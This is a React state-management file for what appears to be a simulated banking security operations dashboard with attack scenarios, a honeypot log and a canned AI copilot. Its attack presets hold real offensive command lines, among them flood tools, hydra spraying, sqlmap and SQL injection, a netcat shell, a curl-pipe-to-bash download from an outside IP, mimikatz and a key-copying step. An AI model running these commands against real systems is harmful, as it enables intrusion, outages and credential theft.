import React, { createContext, useContext, useState, useEffect, useRef, useCallback } from 'react';
import { soundManager } from '../utils/audio';

const SentinelContext = createContext(null);

export const ATTACK_PRESETS = {
  ddos: {
    id: 'ddos',
    name: 'Distributed Denial of Service (DDoS)',
    type: 'Layer 7 HTTP Flood & SYN Storm',
    target: 'api_gateway',
    severity: 'CRITICAL',
    vector: 'Volumetric Ingress Saturation',
    description: '120k+ botnet nodes flooding edge gateway with spoofed TCP SYN & HTTPS POST requests.',
    mitre: 'T1498.001 - Direct Network Flood',
    impactDesc: 'Ingress traffic surge, thread pool depletion, response latency spike',
    commands: [
      'hping3 -c 50000 -d 120 -S -w 64 -p 443 --flood --rand-source 10.0.1.5',
      'slowloris -s 800 -p 443 https://bank.internal/api/v1/auth',
      'wrk -t12 -c400 -d30s --latency https://bank.internal/health'
    ],
    copilotAdvice: 'High-density volumetric Layer 7 attack detected targeting API Gateway. Immediate mitigation required: Enable edge rate-limiting, activate Cloudflare bot-mitigation challenge, and quarantine rogue autonomous ASN ranges.',
    remediationAction: 'Deploy Edge Geo-Rate Limit & Scrubbing Filter'
  },
  brute_force: {
    id: 'brute_force',
    name: 'Credential Brute Force & Stuffing',
    type: 'Distributed Password Spraying',
    target: 'auth_service',
    severity: 'HIGH',
    vector: 'Authentication Abuse & Token Hijack',
    description: 'Rotated proxy farm attempting 15,000 combo logins per minute against /api/v1/login.',
    mitre: 'T1110.003 - Password Spraying',
    impactDesc: 'Auth service CPU saturation, redis token thrashing, MFA queue delay',
    commands: [
      'hydra -L corp_users.txt -P rockyou_pass.txt 10.0.2.10 http-post-form "/api/v1/login:user=^USER^&pass=^PASS^:F=invalid"',
      'python3 spray_spray.py --target auth.bank.internal --concurrency 250 --rotate-proxies',
      'curl -X POST https://bank.internal/api/v1/auth/token -d \'{"grant_type":"client_credentials"}\''
    ],
    copilotAdvice: 'Rapid authentication failures triggered across 4,200 distinct user identifiers. Threat model indicates credential stuffing via residential proxy network. Recommended: Enable CAPTCHA challenge, lock high-risk accounts, enforce step-up MFA.',
    remediationAction: 'Enforce Step-Up MFA & Tor/Proxy Subnet Blacklist'
  },
  sql_injection: {
    id: 'sql_injection',
    name: 'SQL Injection & Data Exfiltration',
    type: 'Blind Boolean & UNION-based SQLi',
    target: 'database',
    severity: 'CRITICAL',
    vector: 'Unsanitized Ingress Query Exploitation',
    description: 'Malicious payload targeting transaction ledger API parameter `account_id` attempting to dump credentials and balances.',
    mitre: 'T1190 - Exploit Public-Facing Application',
    impactDesc: 'PostgreSQL CPU 98%, query lock contention, unauthorized table read attempts',
    commands: [
      'sqlmap -u "https://bank.internal/api/v1/accounts?id=1" --batch --dbs --level=5 --risk=3',
      'SELECT * FROM accounts WHERE id = \'1\' UNION SELECT null, username, password_hash, balance FROM bank_users--',
      'pg_dump -U postgres -h 10.0.4.50 core_banking > /tmp/exfil_dump.sql'
    ],
    copilotAdvice: 'Active SQL injection exploitation identified targeting transaction ledger query engine. Database connection pool under severe strain. Recommended: Trigger WAF parameter sanitization rule, terminate suspicious database sessions, switch to read-only replica fallback.',
    remediationAction: 'Patch Query Parameter WAF Rule & Terminate Hostile DB SIDs'
  },
  malware: {
    id: 'malware',
    name: 'Banking Trojan / Lateral Movement',
    type: 'Advanced Persistent Threat (APT)',
    target: 'transaction_service',
    severity: 'CRITICAL',
    vector: 'Reverse Shell & Memory Injection',
    description: 'Cobalt Strike beaconing detected inside Transaction Worker VM, attempting to alter SWIFT routing and pivot to cold storage vault.',
    mitre: 'T1059.004 - Unix Shell / Lateral Movement',
    impactDesc: 'Unauthorized RPC calls, rogue daemon spawned, memory integrity warning',
    commands: [
      'nc -lvnp 4444 -e /bin/bash &',
      'curl -s http://194.26.29.112/loader.sh | bash',
      'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
      'find /opt/banking/keys -name "*.pem" -exec cp {} /tmp/.cache \\;'
    ],
    copilotAdvice: 'C2 beaconing detected from transaction node 10.0.3.15 communicating with suspicious foreign IP. Process hash mismatch confirmed on `worker-daemon`. Recommended: Immediate network micro-segmentation, quarantine host node, cycle all internal TLS certificates.',
    remediationAction: 'Isolate Host Node & Flush Session Keys'
  }
};

const INITIAL_SYSTEMS = {
  api_gateway: {
    id: 'api_gateway',
    name: 'Edge API Gateway',
    subname: 'Envoy Ingress & WAF Layer',
    role: 'TLS Termination / Rate Limiting',
    status: 'HEALTHY',
    cpu: 22,
    rps: 1420,
    latency: 24,
    errorRate: 0.02,
    connections: 1840,
    anomalies: 0,
    isolated: false,
    processes: [
      { pid: 104, name: 'envoy-edge-proxy', cpu: 12.4, status: 'NORMAL' },
      { pid: 108, name: 'coraza-waf-engine', cpu: 6.8, status: 'NORMAL' },
      { pid: 112, name: 'kong-rate-limiter', cpu: 2.1, status: 'NORMAL' }
    ]
  },
  auth_service: {
    id: 'auth_service',
    name: 'IAM & Authentication',
    subname: 'OAuth2 / Keycloak Cluster',
    role: 'JWT Verification / MFA Provider',
    status: 'HEALTHY',
    cpu: 18,
    rps: 340,
    latency: 31,
    errorRate: 0.05,
    connections: 450,
    anomalies: 0,
    isolated: false,
    processes: [
      { pid: 201, name: 'keycloak-iam-core', cpu: 9.3, status: 'NORMAL' },
      { pid: 204, name: 'redis-session-cache', cpu: 4.1, status: 'NORMAL' },
      { pid: 209, name: 'mfa-totp-validator', cpu: 3.5, status: 'NORMAL' }
    ]
  },
  transaction_service: {
    id: 'transaction_service',
    name: 'Core Transaction Ledger',
    subname: 'SWIFT / ACH Settlement Engine',
    role: 'Double-entry Ledger & Fraud Guard',
    status: 'HEALTHY',
    cpu: 26,
    rps: 820,
    latency: 42,
    errorRate: 0.01,
    connections: 980,
    anomalies: 0,
    isolated: false,
    processes: [
      { pid: 301, name: 'ledger-journal-v3', cpu: 14.2, status: 'NORMAL' },
      { pid: 304, name: 'fraud-model-inference', cpu: 8.5, status: 'NORMAL' },
      { pid: 310, name: 'swift-iso20022-queue', cpu: 2.9, status: 'NORMAL' }
    ]
  },
  database: {
    id: 'database',
    name: 'PostgreSQL High-Availability',
    subname: 'Core Financial Database',
    role: 'Primary ACID Cluster (Pgpool-II)',
    status: 'HEALTHY',
    cpu: 31,
    rps: 1950,
    latency: 18,
    errorRate: 0.03,
    connections: 1220,
    anomalies: 0,
    isolated: false,
    processes: [
      { pid: 401, name: 'postgres-primary-16', cpu: 18.5, status: 'NORMAL' },
      { pid: 405, name: 'pgpool-connection-mgr', cpu: 6.4, status: 'NORMAL' },
      { pid: 408, name: 'wal-streaming-replica', cpu: 4.2, status: 'NORMAL' }
    ]
  }
};

const INITIAL_FEED = [
  { id: 'ev-1', timestamp: '20:58:12', severity: 'INFO', event: 'TLS handshake pool healthy', sourceIp: '10.0.0.1', targetService: 'api_gateway', detail: 'Cipher suite ECDHE-RSA-AES256-GCM-SHA384 negotiation success.' },
  { id: 'ev-2', timestamp: '20:58:34', severity: 'INFO', event: 'JWT token rotation batch completed', sourceIp: '10.0.2.10', targetService: 'auth_service', detail: '3,400 active sessions renewed without incident.' },
  { id: 'ev-3', timestamp: '20:58:50', severity: 'WARNING', event: 'Suspicious header probing detected', sourceIp: '185.220.101.5', targetService: 'api_gateway', detail: 'User-Agent contains scanner signature: curl/7.88.1-scanner' },
  { id: 'ev-4', timestamp: '20:59:02', severity: 'INFO', event: 'PostgreSQL checkpoint written to disk', sourceIp: '10.0.4.50', targetService: 'database', detail: '14.2 MB WAL written, 0 dirty buffers discarded.' }
];

const INITIAL_HONEYPOT_LOGS = [
  { type: 'system', text: '[HONEYPOT-DECEPTION-GRID v4.1] Initialized 3 decoy services (port 22, 443, 5432)' },
  { type: 'system', text: '[MONITOR] Listening for unauthorized reconnaissance on external subnet 194.26.0.0/24' },
  { type: 'traffic', text: 'INCOMING TCP SYN probe from 185.220.101.5:49152 -> 194.26.0.12:22 (SSH Trap)' },
  { type: 'honeypot', text: 'SSH Trap replied with OpenSSH_8.2p1 banner. Adversary initiated key exchange.' }
];

export function SentinelProvider({ children }) {
  const [activeAttack, setActiveAttack] = useState(null);
  const [threatLevel, setThreatLevel] = useState('LOW');
  const [riskScore, setRiskScore] = useState(14);
  const [activeIncidents, setActiveIncidents] = useState([]);
  const [threatFeed, setThreatFeed] = useState(INITIAL_FEED);
  const [bankingSystems, setBankingSystems] = useState(INITIALSystemsCopy());
  const [honeypotLogs, setHoneypotLogs] = useState(INITIAL_HONEYPOT_LOGS);
  const [honeypotState, setHoneypotState] = useState({
    status: 'LISTENING',
    activeAttackerIp: '185.220.101.5',
    attackerCountry: 'Netherlands / Tor Exit',
    mitreTechnique: 'T1595 - Active Scanning',
    trappedConnections: 12,
    deceptionTokensTriggered: 1
  });
  const [telemetryHistory, setTelemetryHistory] = useState({
    cpu: [22, 23, 21, 24, 25, 22, 23, 21, 22, 24, 23, 22, 25, 23, 22],
    rps: [1420, 1435, 1410, 1450, 1425, 1440, 1430, 1415, 1460, 1430, 1445, 1420, 1450, 1430, 1425],
    latency: [24, 25, 23, 26, 24, 25, 23, 24, 26, 24, 23, 25, 24, 26, 24],
    errorRate: [0.02, 0.01, 0.03, 0.02, 0.01, 0.02, 0.01, 0.02, 0.02, 0.01, 0.03, 0.02, 0.01, 0.02, 0.02]
  });
  const [aiCopilot, setAiCopilot] = useState({
    isOpen: false,
    guidance: 'All banking operational corridors operating within nominal security parameters. No active breach vector identified.',
    recommendationAction: null,
    autonomousDefense: false,
    messages: [
      { sender: 'copilot', time: '20:58', text: 'SentinelAI Copilot initialized. Continuous autonomous telemetry inspection engaged across Ingress Gateway, IAM Cluster, Transaction Engine, and HA Database.' }
    ]
  });
  const [audioMuted, setAudioMuted] = useState(false);
  const [stats, setStats] = useState({
    totalIncidents: 0,
    mitigatedIncidents: 0,
    mttdSeconds: 1.2,
    mttrSeconds: 4.6,
    containmentRate: 99.4
  });

  function INITIALSystemsCopy() {
    return JSON.parse(JSON.stringify(INITIAL_SYSTEMS));
  }

  // Sound mute toggle
  const toggleAudio = () => {
    const isMuted = soundManager.toggleMute();
    setAudioMuted(isMuted);
  };

  // Autonomous Defense Auto-Mitigate Timer
  useEffect(() => {
    let timer;
    if (activeAttack && aiCopilot.autonomousDefense && !activeAttack.mitigated) {
      timer = setTimeout(() => {
        mitigateAttack('Autonomous AI Defense Response Triggered');
      }, 5500);
    }
    return () => clearTimeout(timer);
  }, [activeAttack, aiCopilot.autonomousDefense]);

  // Main Realtime Heartbeat Simulation Loop (ticks every 1.2s)
  useEffect(() => {
    const interval = setInterval(() => {
      const now = new Date();
      const timeStr = now.toTimeString().split(' ')[0];

      setBankingSystems(prev => {
        const next = { ...prev };
        Object.keys(next).forEach(key => {
          const sys = { ...next[key] };
          if (sys.isolated) {
            sys.status = 'ISOLATED';
            sys.rps = 0;
            sys.cpu = Math.max(5, sys.cpu * 0.7);
            sys.latency = 0;
            return;
          }

          if (activeAttack && activeAttack.target === key) {
            // Under attack dynamics
            if (activeAttack.id === 'ddos') {
              sys.status = 'CRITICAL';
              sys.cpu = Math.min(98, Math.max(88, sys.cpu + (Math.random() * 4 - 1.5)));
              sys.rps = Math.floor(115000 + Math.random() * 25000);
              sys.latency = Math.floor(380 + Math.random() * 120);
              sys.errorRate = parseFloat((18.5 + Math.random() * 8.2).toFixed(2));
              sys.anomalies = (sys.anomalies || 0) + 1;
            } else if (activeAttack.id === 'brute_force') {
              sys.status = 'UNDER ATTACK';
              sys.cpu = Math.min(92, Math.max(78, sys.cpu + (Math.random() * 3 - 1)));
              sys.rps = Math.floor(8400 + Math.random() * 1800);
              sys.latency = Math.floor(280 + Math.random() * 90);
              sys.errorRate = parseFloat((38.4 + Math.random() * 9.5).toFixed(2));
              sys.anomalies = (sys.anomalies || 0) + 1;
            } else if (activeAttack.id === 'sql_injection') {
              sys.status = 'COMPROMISED';
              sys.cpu = Math.min(99, Math.max(91, sys.cpu + (Math.random() * 2 - 0.5)));
              sys.rps = Math.floor(3200 + Math.random() * 600);
              sys.latency = Math.floor(520 + Math.random() * 180);
              sys.errorRate = parseFloat((14.2 + Math.random() * 4.6).toFixed(2));
              sys.anomalies = (sys.anomalies || 0) + 1;
            } else if (activeAttack.id === 'malware') {
              sys.status = 'CRITICAL';
              sys.cpu = Math.min(88, Math.max(72, sys.cpu + (Math.random() * 3 - 1)));
              sys.rps = Math.floor(1200 + Math.random() * 300);
              sys.latency = Math.floor(160 + Math.random() * 40);
              sys.errorRate = parseFloat((8.9 + Math.random() * 3.1).toFixed(2));
              sys.anomalies = (sys.anomalies || 0) + 1;
            }
          } else {
            // Normal baseline jitter
            const baseCpu = key === 'database' ? 31 : key === 'transaction_service' ? 26 : key === 'api_gateway' ? 22 : 18;
            sys.cpu = Math.max(12, Math.min(42, Math.round(baseCpu + (Math.random() * 6 - 3))));
            const baseRps = key === 'api_gateway' ? 1420 : key === 'database' ? 1950 : key === 'transaction_service' ? 820 : 340;
            sys.rps = Math.max(100, Math.round(baseRps + (Math.random() * 80 - 40)));
            const baseLat = key === 'transaction_service' ? 42 : key === 'auth_service' ? 31 : key === 'api_gateway' ? 24 : 18;
            sys.latency = Math.max(10, Math.round(baseLat + (Math.random() * 4 - 2)));
            sys.errorRate = parseFloat((0.01 + Math.random() * 0.02).toFixed(2));
            sys.status = 'HEALTHY';
          }
          next[key] = sys;
        });
        return next;
      });

      // Update aggregate Telemetry history
      setTelemetryHistory(prev => {
        const targetSys = activeAttack ? bankingSystems[activeAttack.target] : bankingSystems.api_gateway;
        const currentCpu = targetSys ? targetSys.cpu : 24;
        const currentRps = targetSys ? targetSys.rps : 1420;
        const currentLat = targetSys ? targetSys.latency : 25;
        const currentErr = targetSys ? targetSys.errorRate : 0.02;

        return {
          cpu: [...prev.cpu.slice(1), currentCpu],
          rps: [...prev.rps.slice(1), currentRps],
          latency: [...prev.latency.slice(1), currentLat],
          errorRate: [...prev.errorRate.slice(1), currentErr]
        };
      });

      // Background Threat Feed item (occasional ambient log)
      if (Math.random() > 0.65 && !activeAttack) {
        const ambientEvents = [
          { sev: 'INFO', ev: 'BGP Anycast routing path verified', src: '10.0.0.254', tgt: 'api_gateway', det: 'Autonomous System AS13335 healthy latency 4ms.' },
          { sev: 'INFO', ev: 'mTLS verification handshake passed', src: '10.0.3.14', tgt: 'transaction_service', det: 'Client cert: cn=microservice-settlement-02 validated.' },
          { sev: 'INFO', ev: 'PostgreSQL WAL replication stream sync', src: '10.0.4.52', tgt: 'database', det: 'Replication lag 0.04ms across 3 read replicas.' },
          { sev: 'WARNING', ev: 'Minor TLS rate warning on perimeter', src: '198.51.100.84', tgt: 'api_gateway', det: 'Burst threshold reached: 60 req/min from single CIDR.' }
        ];
        const pick = ambientEvents[Math.floor(Math.random() * ambientEvents.length)];
        setThreatFeed(f => [
          {
            id: `ev-${Date.now()}`,
            timestamp: timeStr,
            severity: pick.sev,
            event: pick.ev,
            sourceIp: pick.src,
            targetService: pick.tgt,
            detail: pick.det
          },
          ...f.slice(0, 39)
        ]);
      }
    }, 1200);

    return () => clearInterval(interval);
  }, [activeAttack, bankingSystems]);

  // Launch Attack Scenario
  const launchAttack = useCallback((attackType) => {
    const preset = ATTACK_PRESETS[attackType];
    if (!preset) return;

    soundManager.playAlert();
    const now = new Date();
    const timeStr = now.toTimeString().split(' ')[0];

    const newAttack = {
      ...preset,
      startTime: Date.now(),
      stage: 'Active Infiltration & Delivery',
      mitigated: false
    };

    setActiveAttack(newAttack);
    setThreatLevel('CRITICAL');
    setRiskScore(attackType === 'ddos' ? 96 : attackType === 'sql_injection' ? 92 : attackType === 'brute_force' ? 84 : 89);

    // Update incident list
    const newIncident = {
      id: `INC-${Date.now().toString().slice(-5)}`,
      title: `${preset.name} in progress`,
      type: preset.type,
      target: preset.target,
      severity: preset.severity,
      time: timeStr,
      status: 'ACTIVE',
      details: preset.description,
      mitre: preset.mitre
    };

    setActiveIncidents(prev => [newIncident, ...prev]);

    // Update Banking System under attack
    setBankingSystems(prev => {
      const next = { ...prev };
      const target = next[preset.target];
      if (target) {
        target.status = preset.id === 'sql_injection' ? 'COMPROMISED' : 'CRITICAL';
        target.anomalies = (target.anomalies || 0) + 3;
        // Inject rogue process
        if (preset.id === 'malware') {
          target.processes = [
            { pid: 994, name: 'nc -e /bin/sh (C2_BEACON)', cpu: 28.4, status: 'ROGUE_EXEC' },
            ...target.processes
          ];
        } else if (preset.id === 'sql_injection') {
          target.processes = [
            { pid: 882, name: 'sqlmap-subquery-drain', cpu: 34.1, status: 'HOSTILE' },
            ...target.processes
          ];
        } else if (preset.id === 'ddos') {
          target.processes = [
            { pid: 771, name: 'syn-flood-backlog-overflow', cpu: 41.2, status: 'EXHAUSTED' },
            ...target.processes
          ];
        } else if (preset.id === 'brute_force') {
          target.processes = [
            { pid: 662, name: 'hydra-spray-worker', cpu: 29.8, status: 'HOSTILE' },
            ...target.processes
          ];
        }
      }
      return next;
    });

    // Threat Feed entries for the attack
    const attackFeedItems = [
      {
        id: `ev-atk-${Date.now()}-1`,
        timestamp: timeStr,
        severity: 'CRITICAL',
        event: `ATTACK TRIGGERED: ${preset.name}`,
        sourceIp: '185.220.101.5 / 194.26.29.112',
        targetService: preset.target,
        detail: preset.description
      },
      {
        id: `ev-atk-${Date.now()}-2`,
        timestamp: timeStr,
        severity: 'HIGH',
        event: `MITRE ATT&CK Alert: ${preset.mitre}`,
        sourceIp: '185.220.101.5',
        targetService: preset.target,
        detail: `Tactical exploit sequence executed. Side-channel anomaly index spiked above 90.`
      }
    ];

    setThreatFeed(prev => [...attackFeedItems, ...prev.slice(0, 35)]);

    // Update Honeypot
    setHoneypotState({
      status: 'TARPIT_LOCKED',
      activeAttackerIp: '185.220.101.5',
      attackerCountry: 'Netherlands / Bulletproof VPS (AS208323)',
      mitreTechnique: preset.mitre,
      trappedConnections: Math.floor(180 + Math.random() * 120),
      deceptionTokensTriggered: Math.floor(4 + Math.random() * 6)
    });

    setHoneypotLogs(prev => [
      { type: 'alert', text: `[CRITICAL INTRUSION] Honeypot deception decoy engaged for ${preset.name}` },
      { type: 'cmd', text: `root@adversary-box:~# ${preset.commands[0]}` },
      { type: 'output', text: `[+] Transmitting malicious packets to decoy node 194.26.0.12...` },
      { type: 'cmd', text: `root@adversary-box:~# ${preset.commands[1] || preset.commands[0]}` },
      { type: 'honeypot', text: `[SENTINEL DECEPTION] Trapped adversary session inside shadow sandbox container.` },
      ...prev.slice(0, 30)
    ]);

    // AI Copilot updates
    setAiCopilot(prev => ({
      ...prev,
      guidance: preset.copilotAdvice,
      recommendationAction: preset.remediationAction,
      messages: [
        {
          sender: 'copilot',
          time: timeStr,
          text: `🚨 CRITICAL ALERT: ${preset.name} detected against ${preset.target.toUpperCase()}. Threat score spiked to ${preset.severity}. Recommended countermeasure: ${preset.remediationAction}.`
        },
        ...prev.messages
      ]
    }));

    setStats(prev => ({
      ...prev,
      totalIncidents: prev.totalIncidents + 1
    }));
  }, []);

  // Mitigate Attack
  const mitigateAttack = useCallback((actionTaken = 'Automated Mitigation Action') => {
    soundManager.playSuccess();
    const now = new Date();
    const timeStr = now.toTimeString().split(' ')[0];

    setActiveAttack(null);
    setThreatLevel('LOW');
    setRiskScore(16);

    // Update incidents as mitigated
    setActiveIncidents(prev =>
      prev.map((inc, i) => (i === 0 && inc.status === 'ACTIVE' ? { ...inc, status: 'MITIGATED', mitigatedAt: timeStr } : inc))
    );

    // Reset systems to clean
    setBankingSystems(INITIALSystemsCopy());

    // Threat feed resolution log
    setThreatFeed(prev => [
      {
        id: `ev-res-${Date.now()}`,
        timestamp: timeStr,
        severity: 'INFO',
        event: 'MITIGATION EXECUTED & DEFENSE ENFORCED',
        sourceIp: 'SOC-ENGINE-01',
        targetService: 'ALL',
        detail: `Remediation action '${actionTaken}' successfully sealed attack vectors. Risk score dropped to nominal.`
      },
      ...prev.slice(0, 35)
    ]);

    // Honeypot log resolution
    setHoneypotState(prev => ({
      ...prev,
      status: 'LISTENING',
      trappedConnections: 0
    }));

    setHoneypotLogs(prev => [
      { type: 'system', text: `[REMEDIATION COMPLETE] Threat neutralized. Adversary session terminated and forensic dump saved.` },
      ...prev.slice(0, 30)
    ]);

    // Copilot response
    setAiCopilot(prev => ({
      ...prev,
      guidance: 'Threat successfully neutralized. Perimeter firewalls updated, rogue sockets culled, system latency stabilized.',
      recommendationAction: null,
      messages: [
        {
          sender: 'copilot',
          time: timeStr,
          text: `🛡️ Defense executed: "${actionTaken}". All banking nodes recovered. Zero customer balance leakage confirmed.`
        },
        ...prev.messages
      ]
    }));

    setStats(prev => ({
      ...prev,
      mitigatedIncidents: prev.mitigatedIncidents + 1,
      mttdSeconds: parseFloat((1.1 + Math.random() * 0.4).toFixed(2)),
      mttrSeconds: parseFloat((3.8 + Math.random() * 1.2).toFixed(2))
    }));
  }, []);

  // Full Demo Reset
  const resetDemo = useCallback(() => {
    soundManager.playBlip(600, 0.1);
    setActiveAttack(null);
    setThreatLevel('LOW');
    setRiskScore(14);
    setActiveIncidents([]);
    setBankingSystems(INITIALSystemsCopy());
    setThreatFeed(INITIAL_FEED);
    setHoneypotLogs(INITIAL_HONEYPOT_LOGS);
    setHoneypotState({
      status: 'LISTENING',
      activeAttackerIp: '185.220.101.5',
      attackerCountry: 'Netherlands / Tor Exit',
      mitreTechnique: 'T1595 - Active Scanning',
      trappedConnections: 12,
      deceptionTokensTriggered: 1
    });
    setAiCopilot(prev => ({
      ...prev,
      guidance: 'Demo state reset complete. Enterprise banking perimeter in clean baseline inspection mode.',
      recommendationAction: null,
      messages: [
        {
          sender: 'copilot',
          time: new Date().toTimeString().split(' ')[0],
          text: 'Demo environment reset to baseline. Telemetry sensors synchronized, attack injectors standing by.'
        }
      ]
    }));
  }, []);

  // Isolate a specific banking system
  const isolateSystem = useCallback((key) => {
    soundManager.playAlert();
    setBankingSystems(prev => ({
      ...prev,
      [key]: {
        ...prev[key],
        isolated: true,
        status: 'ISOLATED'
      }
    }));
    setThreatFeed(prev => [
      {
        id: `ev-iso-${Date.now()}`,
        timestamp: new Date().toTimeString().split(' ')[0],
        severity: 'WARNING',
        event: `SYSTEM NODE ISOLATED: ${key.toUpperCase()}`,
        sourceIp: 'SOC-ADMIN',
        targetService: key,
        detail: 'Containment protocol active. Network interfaces disabled, traffic blackholed.'
      },
      ...prev.slice(0, 35)
    ]);
  }, []);

  // Restore an isolated banking system
  const restoreSystem = useCallback((key) => {
    soundManager.playSuccess();
    setBankingSystems(prev => ({
      ...prev,
      [key]: {
        ...prev[key],
        isolated: false,
        status: 'HEALTHY'
      }
    }));
    setThreatFeed(prev => [
      {
        id: `ev-rst-${Date.now()}`,
        timestamp: new Date().toTimeString().split(' ')[0],
        severity: 'INFO',
        event: `SYSTEM NODE RESTORED: ${key.toUpperCase()}`,
        sourceIp: 'SOC-ADMIN',
        targetService: key,
        detail: 'Containment lifted. Health probes passing, traffic ingress resumed.'
      },
      ...prev.slice(0, 35)
    ]);
  }, []);

  // Send interactive question to AI Copilot
  const sendCopilotMessage = useCallback((userText) => {
    soundManager.playBlip(750, 0.05);
    const now = new Date();
    const timeStr = now.toTimeString().split(' ')[0];

    const userMsg = { sender: 'user', time: timeStr, text: userText };

    // Formulate intelligent SOC response based on current context
    let replyText = '';
    const lower = userText.toLowerCase();

    if (lower.includes('ddos') || lower.includes('flood')) {
      replyText = 'DDoS telemetry reveals volumetric layer 7 request floods. Ingress scrubbing filters and syn-cookies can shed up to 99.8% of hostile packets before hitting proxy worker pools.';
    } else if (lower.includes('sql') || lower.includes('injection') || lower.includes('database')) {
      replyText = 'SQLi detections triggered on parameter /api/v1/accounts?id. Recommendation: enforce parameterized queries via PreparedStatements and bind WAF signature 942100 to block boolean-based SQL extraction.';
    } else if (lower.includes('brute') || lower.includes('auth') || lower.includes('credential')) {
      replyText = 'Credential stuffing signatures detect rotating source IPs against /api/v1/login. We recommend step-up biometric MFA, exponential rate limiting, and ephemeral token revoking.';
    } else if (lower.includes('malware') || lower.includes('trojan') || lower.includes('c2')) {
      replyText = 'Reverse shell binary detected attempting outbound C2 beaconing. Immediate network quarantine of node 10.0.3.15 and memory volatility forensics analysis are scheduled.';
    } else if (lower.includes('status') || lower.includes('health')) {
      replyText = `Current SOC Posture: Risk Score is ${riskScore}/100. Threat Level is ${threatLevel}. Active attack: ${activeAttack ? activeAttack.name : 'None (Nominal)'}.`;
    } else if (lower.includes('mitigate') || lower.includes('fix')) {
      replyText = 'To neutralize current threats, click the "Mitigate Threat" button or enable Autonomous Defense for sub-second automated remediation.';
    } else {
      replyText = `Analysis of live telemetry stream: All banking subsystems are monitored. Active anomalies: ${Object.values(bankingSystems).reduce((acc, s) => acc + (s.anomalies || 0), 0)}. Autonomous response playbooks stand ready for deployment.`;
    }

    const copilotMsg = { sender: 'copilot', time: timeStr, text: replyText };

    setAiCopilot(prev => ({
      ...prev,
      messages: [copilotMsg, userMsg, ...prev.messages]
    }));
  }, [riskScore, threatLevel, activeAttack, bankingSystems]);

  return (
    <SentinelContext.Provider
      value={{
        activeAttack,
        threatLevel,
        riskScore,
        activeIncidents,
        threatFeed,
        bankingSystems,
        honeypotLogs,
        honeypotState,
        telemetryHistory,
        aiCopilot,
        audioMuted,
        stats,
        launchAttack,
        mitigateAttack,
        resetDemo,
        isolateSystem,
        restoreSystem,
        sendCopilotMessage,
        toggleAudio,
        toggleAutonomousDefense: () =>
          setAiCopilot(prev => ({ ...prev, autonomousDefense: !prev.autonomousDefense })),
        toggleCopilotOpen: () =>
          setAiCopilot(prev => ({ ...prev, isOpen: !prev.isOpen }))
      }}
    >
      {children}
    </SentinelContext.Provider>
  );
}

export const useSentinel = () => {
  const context = useContext(SentinelContext);
  if (!context) {
    throw new Error('useSentinel must be used within a SentinelProvider');
  }
  return context;
};

